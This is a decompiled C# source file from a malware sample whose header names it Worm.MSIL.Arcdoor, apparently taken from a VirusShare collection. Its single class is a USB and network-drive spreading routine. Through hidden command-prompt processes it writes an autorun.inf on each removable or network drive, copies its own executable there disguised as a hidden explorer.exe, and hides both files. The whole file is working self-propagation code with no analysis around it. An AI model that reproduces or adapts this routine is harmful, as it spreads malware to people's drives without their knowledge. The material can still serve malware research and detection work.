// Decompiled with JetBrains decompiler
// Type: SysDriver.cUSBSpread
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace SysDriver
{
  internal class cUSBSpread
  {
    public static void USBSpread()
    {
      try
      {
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          if ((drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.Network) && !File.Exists(drive.Name + "explorer.exe"))
          {
            Process process1 = new Process();
            process1.EnableRaisingEvents = false;
            process1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process1.StartInfo.FileName = "cmd";
            process1.StartInfo.Arguments = "/c echo [autorun] >> " + drive.Name + "autorun.inf";
            process1.Start();
            do
              ;
            while (!process1.HasExited);
            Process process2 = new Process();
            process2.EnableRaisingEvents = false;
            process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process2.StartInfo.FileName = "cmd";
            process2.StartInfo.Arguments = "/c echo open=explorer.exe >> " + drive.Name + "autorun.inf";
            process2.Start();
            do
              ;
            while (!process2.HasExited);
            File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);
            string fileName = Process.GetCurrentProcess().MainModule.FileName;
            try
            {
              Process process3 = new Process();
              process3.EnableRaisingEvents = false;
              process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
              process3.StartInfo.FileName = "cmd";
              process3.StartInfo.Arguments = "/c copy \"" + Application.ExecutablePath + "\" \"" + drive.Name + "explorer.exe\"";
              process3.Start();
              do
                ;
              while (!process3.HasExited);
              File.SetAttributes(drive.Name + "explorer.exe", File.GetAttributes(drive.Name + "explorer.exe") | FileAttributes.Hidden);
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
    }
  }
}
